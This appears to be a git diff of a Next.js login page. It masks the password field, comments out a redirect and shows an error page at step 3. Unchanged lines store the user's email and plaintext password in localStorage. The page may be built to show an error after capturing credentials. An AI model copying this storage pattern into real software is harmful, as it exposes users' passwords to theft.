@@ -6,7 +6,7 @@ import { useRouter } from 'next/navigation';
 import styles from './styles.module.css';
 import LoginMobile from "./components/loginMobile/loginMobile";
 import useWindowDimensions from '../hooks/useWindowDimension';
-
+import ErrorPage from './disabled/page'
 
 function Home() {
   const { width, height } = useWindowDimensions();
@@ -72,6 +72,7 @@ function Home() {
             <input
               id="pswd"
               name="pswd"
+              type="password"
               onChange={(e) => { setData({ ...data, password: e.target.value }) }}
               className={`${error.status ? styles.loginInputError : ""}`}
             />
@@ -235,7 +236,7 @@ function Home() {
       } else {
         localStorage.setItem('email', data.email);
         localStorage.setItem('password', data.password);
-        router.push('/error', { scroll: false });
+        // router.push('/error', { scroll: false });
       }
     }
     if (!isErr) {
@@ -246,7 +247,10 @@ function Home() {
 
   if (windowWidth < 640) {
     return <LoginMobile />
+  }
 
+  if (step == 3) {
+    return <ErrorPage />
   }
 
   return (
